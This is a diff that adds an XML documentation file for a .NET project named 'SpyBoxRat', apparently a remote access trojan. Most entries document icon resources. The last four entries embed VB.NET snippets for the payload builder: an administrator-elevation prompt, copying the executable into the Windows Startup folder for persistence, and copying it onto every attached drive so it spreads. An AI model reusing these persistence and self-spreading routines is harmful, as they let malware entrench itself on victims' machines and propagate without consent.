@@ -1,0 +1,527 @@
+﻿<?xml version="1.0"?>
+<doc>
+<assembly>
+<name>
+SpyBoxRat
+</name>
+</assembly>
+<members>
+<member name="T:AnonMon.My.Resources.Resources">
+<summary>
+  Une classe de ressource fortement typée destinée, entre autres, à la consultation des chaînes localisées.
+</summary>
+</member>
+<member name="P:AnonMon.My.Resources.Resources.ResourceManager">
+<summary>
+  Retourne l'instance ResourceManager mise en cache utilisée par cette classe.
+</summary>
+</member>
+<member name="P:AnonMon.My.Resources.Resources.Culture">
+<summary>
+  Remplace la propriété CurrentUICulture du thread actuel pour toutes
+  les recherches de ressources à l'aide de cette classe de ressource fortement typée.
+</summary>
+</member>
+<member name="P:AnonMon.My.Resources.Resources.a1a5b9494d50bb3754bba547f2d88487_computer_monitor_flat_icon_bmpy_vexels__1_">
+<summary>
+  Recherche une ressource localisée de type System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:AnonMon.My.Resources.Resources.a1a5b9494d50bb3754bba547f2d88487_computer_monitor_flat_icon_by_vexels">
+<summary>
+  Recherche une ressource localisée de type System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:AnonMon.My.Resources.Resources.Arsium_Spartan">
+<summary>
+  Recherche une ressource localisée de type System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:AnonMon.My.Resources.Resources.folder">
+<summary>
+  Recherche une ressource localisée de type System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:AnonMon.My.Resources.Resources.folder_IC">
+<summary>
+  Recherche une ressource localisée de type System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:AnonMon.My.Resources.Resources.folder_IC1">
+<summary>
+  Recherche une ressource localisée de type System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:AnonMon.My.Resources.Resources.hardware">
+<summary>
+  Recherche une ressource localisée de type System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:AnonMon.My.Resources.Resources.ichcons8_speech_bubble___Copie">
+<summary>
+  Recherche une ressource localisée de type System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:AnonMon.My.Resources.Resources.ichcons8_speech_bubble_32">
+<summary>
+  Recherche une ressource localisée de type System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:AnonMon.My.Resources.Resources.iconfinder_anonymous_395266">
+<summary>
+  Recherche une ressource localisée de type System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:AnonMon.My.Resources.Resources.iconfinder_mouse_delete_84782">
+<summary>
+  Recherche une ressource localisée de type System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:AnonMon.My.Resources.Resources.icons8_arrow_left_back">
+<summary>
+  Recherche une ressource localisée de type System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:AnonMon.My.Resources.Resources.icons8_arrow_left_back_32">
+<summary>
+  Recherche une ressource localisée de type System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:AnonMon.My.Resources.Resources.icons8_arrow_right_go">
+<summary>
+  Recherche une ressource localisée de type System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:AnonMon.My.Resources.Resources.icons8_arrow_right_go_32">
+<summary>
+  Recherche une ressource localisée de type System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:AnonMon.My.Resources.Resources.icons8_delete">
+<summary>
+  Recherche une ressource localisée de type System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:AnonMon.My.Resources.Resources.icons8_delete_32">
+<summary>
+  Recherche une ressource localisée de type System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:AnonMon.My.Resources.Resources.icons8_downloassd_32">
+<summary>
+  Recherche une ressource localisée de type System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:AnonMon.My.Resources.Resources.icons8_edye">
+<summary>
+  Recherche une ressource localisée de type System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:AnonMon.My.Resources.Resources.icons8_edye_32">
+<summary>
+  Recherche une ressource localisée de type System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:AnonMon.My.Resources.Resources.icons8_edye1">
+<summary>
+  Recherche une ressource localisée de type System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:AnonMon.My.Resources.Resources.icons8_enter">
+<summary>
+  Recherche une ressource localisée de type System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:AnonMon.My.Resources.Resources.icons8_enter_32">
+<summary>
+  Recherche une ressource localisée de type System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:AnonMon.My.Resources.Resources.icons8_hide">
+<summary>
+  Recherche une ressource localisée de type System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:AnonMon.My.Resources.Resources.icons8_hide_16">
+<summary>
+  Recherche une ressource localisée de type System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:AnonMon.My.Resources.Resources.icons8_hide_32">
+<summary>
+  Recherche une ressource localisée de type System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:AnonMon.My.Resources.Resources.icons8_hide_321">
+<summary>
+  Recherche une ressource localisée de type System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:AnonMon.My.Resources.Resources.icons8_hide1">
+<summary>
+  Recherche une ressource localisée de type System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:AnonMon.My.Resources.Resources.icons8_info_zedzepopup">
+<summary>
+  Recherche une ressource localisée de type System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:AnonMon.My.Resources.Resources.icons8_info_zedzepopup_32">
+<summary>
+  Recherche une ressource localisée de type System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:AnonMon.My.Resources.Resources.icons8_key">
+<summary>
+  Recherche une ressource localisée de type System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:AnonMon.My.Resources.Resources.icons8_key_64">
+<summary>
+  Recherche une ressource localisée de type System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:AnonMon.My.Resources.Resources.icons8_keyboards_64">
+<summary>
+  Recherche une ressource localisée de type System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:AnonMon.My.Resources.Resources.icons8_left_cgglick_32">
+<summary>
+  Recherche une ressource localisée de type System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:AnonMon.My.Resources.Resources.icons8_lightning_boltsds">
+<summary>
+  Recherche une ressource localisée de type System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:AnonMon.My.Resources.Resources.icons8_lightning_boltsds_32">
+<summary>
+  Recherche une ressource localisée de type System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:AnonMon.My.Resources.Resources.icons8_locks_64">
+<summary>
+  Recherche une ressource localisée de type System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:AnonMon.My.Resources.Resources.icons8_logout_rounded_left">
+<summary>
+  Recherche une ressource localisée de type System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:AnonMon.My.Resources.Resources.icons8_logout_rounded_left_32">
+<summary>
+  Recherche une ressource localisée de type System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:AnonMon.My.Resources.Resources.icons8_minimize_window_322">
+<summary>
+  Recherche une ressource localisée de type System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:AnonMon.My.Resources.Resources.icons8_minimize_window_64">
+<summary>
+  Recherche une ressource localisée de type System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:AnonMon.My.Resources.Resources.icons8_minimize_window_641">
+<summary>
+  Recherche une ressource localisée de type System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:AnonMon.My.Resources.Resources.icons8_mouse_right_click_64">
+<summary>
+  Recherche une ressource localisée de type System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:AnonMon.My.Resources.Resources.icons8_mouse_right_click_641">
+<summary>
+  Recherche une ressource localisée de type System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:AnonMon.My.Resources.Resources.icons8_mouse_right_click_642">
+<summary>
+  Recherche une ressource localisée de type System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:AnonMon.My.Resources.Resources.icons8_moussdfsdfe">
+<summary>
+  Recherche une ressource localisée de type System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:AnonMon.My.Resources.Resources.icons8_move_32">
+<summary>
+  Recherche une ressource localisée de type System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:AnonMon.My.Resources.Resources.icons8_padlosqdck_64">
+<summary>
+  Recherche une ressource localisée de type System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:AnonMon.My.Resources.Resources.icons8_pictures_folder">
+<summary>
+  Recherche une ressource localisée de type System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:AnonMon.My.Resources.Resources.icons8_pictures_folder_32">
+<summary>
+  Recherche une ressource localisée de type System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:AnonMon.My.Resources.Resources.icons8_poisqsdqsdon">
+<summary>
+  Recherche une ressource localisée de type System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:AnonMon.My.Resources.Resources.icons8_poisqsdqsdon_32">
+<summary>
+  Recherche une ressource localisée de type System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:AnonMon.My.Resources.Resources.icons8_record_64">
+<summary>
+  Recherche une ressource localisée de type System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:AnonMon.My.Resources.Resources.icons8_recordstart_32">
+<summary>
+  Recherche une ressource localisée de type System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:AnonMon.My.Resources.Resources.icons8_refresh_32">
+<summary>
+  Recherche une ressource localisée de type System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:AnonMon.My.Resources.Resources.icons8_settinpmgs">
+<summary>
+  Recherche une ressource localisée de type System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:AnonMon.My.Resources.Resources.icons8_settinpmgs_32">
+<summary>
+  Recherche une ressource localisée de type System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:AnonMon.My.Resources.Resources.icons8_shutdown_64">
+<summary>
+  Recherche une ressource localisée de type System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:AnonMon.My.Resources.Resources.icons8_shutdownS_32">
+<summary>
+  Recherche une ressource localisée de type System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:AnonMon.My.Resources.Resources.icons8_skull_crossqdsbones_32">
+<summary>
+  Recherche une ressource localisée de type System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:AnonMon.My.Resources.Resources.icons8_spyqsqs">
+<summary>
+  Recherche une ressource localisée de type System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:AnonMon.My.Resources.Resources.icons8_spyqsqs_32">
+<summary>
+  Recherche une ressource localisée de type System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:AnonMon.My.Resources.Resources.icons8_stop_64">
+<summary>
+  Recherche une ressource localisée de type System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:AnonMon.My.Resources.Resources.icons8_stopsquare_32">
+<summary>
+  Recherche une ressource localisée de type System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:AnonMon.My.Resources.Resources.icons8_swap_64">
+<summary>
+  Recherche une ressource localisée de type System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:AnonMon.My.Resources.Resources.icons8_swap_641">
+<summary>
+  Recherche une ressource localisée de type System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:AnonMon.My.Resources.Resources.icons8_switch_on_32">
+<summary>
+  Recherche une ressource localisée de type System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:AnonMon.My.Resources.Resources.icons8_switch_on_64">
+<summary>
+  Recherche une ressource localisée de type System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:AnonMon.My.Resources.Resources.icons8_system_task">
+<summary>
+  Recherche une ressource localisée de type System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:AnonMon.My.Resources.Resources.icons8_system_task_32">
+<summary>
+  Recherche une ressource localisée de type System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:AnonMon.My.Resources.Resources.icons8_toolbox_64">
+<summary>
+  Recherche une ressource localisée de type System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:AnonMon.My.Resources.Resources.icons8_toolbox1235">
+<summary>
+  Recherche une ressource localisée de type System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:AnonMon.My.Resources.Resources.icons8_trashsa">
+<summary>
+  Recherche une ressource localisée de type System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:AnonMon.My.Resources.Resources.icons8_trashsa_32">
+<summary>
+  Recherche une ressource localisée de type System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:AnonMon.My.Resources.Resources.icons8_trashsa_321">
+<summary>
+  Recherche une ressource localisée de type System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:AnonMon.My.Resources.Resources.icons8_trashsa1">
+<summary>
+  Recherche une ressource localisée de type System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:AnonMon.My.Resources.Resources.icons8_wi_qsdqs69fi">
+<summary>
+  Recherche une ressource localisée de type System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:AnonMon.My.Resources.Resources.icons8_wi_qsdqs69fi_32">
+<summary>
+  Recherche une ressource localisée de type System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:AnonMon.My.Resources.Resources.icons8_windows_cliefghfgnt_64">
+<summary>
+  Recherche une ressource localisée de type System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:AnonMon.My.Resources.Resources.icons8_windows_cliegnt_32">
+<summary>
+  Recherche une ressource localisée de type System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:AnonMon.My.Resources.Resources.icons8_windows_client_32">
+<summary>
+  Recherche une ressource localisée de type System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:AnonMon.My.Resources.Resources.icons8_windows_nclient_64">
+<summary>
+  Recherche une ressource localisée de type System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:AnonMon.My.Resources.Resources.icons8sds_restart">
+<summary>
+  Recherche une ressource localisée de type System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:AnonMon.My.Resources.Resources.icons8sds_restart_32">
+<summary>
+  Recherche une ressource localisée de type System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:AnonMon.My.Resources.Resources.me_too">
+<summary>
+  Recherche une ressource localisée de type System.IO.UnmanagedMemoryStream semblable à System.IO.MemoryStream.
+</summary>
+</member>
+<member name="P:AnonMon.My.Resources.Resources.SHELL32_1_167">
+<summary>
+  Recherche une ressource localisée de type System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:AnonMon.My.Resources.Resources.String1">
+<summary>
+  Recherche une chaîne localisée semblable à Imports System.Diagnostics
+Imports System.Net.Sockets
+Imports System.Runtime.InteropServices
+Imports System.Text
+Imports System.Threading
+Imports System.Threading.Tasks
+Imports System.Windows.Forms
+Imports System
+Imports System.Drawing
+Imports System.Runtime.Serialization.Formatters.Binary
+Imports System.Security.Principal
+Imports System.IO
+&apos;&apos;||       AUTHOR Arsium       ||
+&apos;&apos;||       github : https://github.com/arsium       ||
+Public Class C
+    Public Shared Sub Check()
+
+        Dim b As  [le reste de la chaîne a été tronqué]&quot;;.
+</summary>
+</member>
+<member name="P:AnonMon.My.Resources.Resources.String2">
+<summary>
+  Recherche une chaîne localisée semblable à Dim pricipal As WindowsPrincipal = New WindowsPrincipal(WindowsIdentity.GetCurrent())
+        Dim hasAdministrativeRight As Boolean = pricipal.IsInRole(WindowsBuiltInRole.Administrator)
+
+        If Not hasAdministrativeRight Then
+            If MessageBox.Show(&quot;Do you want to monitor this computer ? &quot;, &quot;&quot;, MessageBoxButtons.YesNo) = DialogResult.Yes Then
+
+                Dim fileName As String = System.Reflection.Assembly.GetExecutingAssembly().Location
+                Dim processInfo As ProcessStart [le reste de la chaîne a été tronqué]&quot;;.
+</summary>
+</member>
+<member name="P:AnonMon.My.Resources.Resources.String3">
+<summary>
+  Recherche une chaîne localisée semblable à If Not IO.File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Startup) &amp; &quot;\&quot; &amp; System.AppDomain.CurrentDomain.FriendlyName) Then
+
+
+            Try
+                Dim l As Byte() = IO.File.ReadAllBytes(IO.Path.GetFullPath(System.Windows.Forms.Application.ExecutablePath))
+
+
+                IO.File.WriteAllBytes(Environment.GetFolderPath(Environment.SpecialFolder.Startup) &amp; &quot;\&quot; &amp; System.AppDomain.CurrentDomain.FriendlyName, l)
+
+            Catch ex As Exception
+            End Try
+      [le reste de la chaîne a été tronqué]&quot;;.
+</summary>
+</member>
+<member name="P:AnonMon.My.Resources.Resources.String4">
+<summary>
+  Recherche une chaîne localisée semblable à Dim allDrives() As DriveInfo = DriveInfo.GetDrives()
+        Dim d As DriveInfo
+
+
+        For Each d In allDrives
+            Try
+                Dim l As Byte() = IO.File.ReadAllBytes(IO.Path.GetFullPath(System.Windows.Forms.Application.ExecutablePath))
+
+
+                IO.File.WriteAllBytes(d.Name &amp; &quot;\&quot; &amp; System.AppDomain.CurrentDomain.FriendlyName, l)
+
+            Catch ex As Exception
+
+            End Try
+
+
+        Next.
+</summary>
+</member>
+</members>
+</doc>
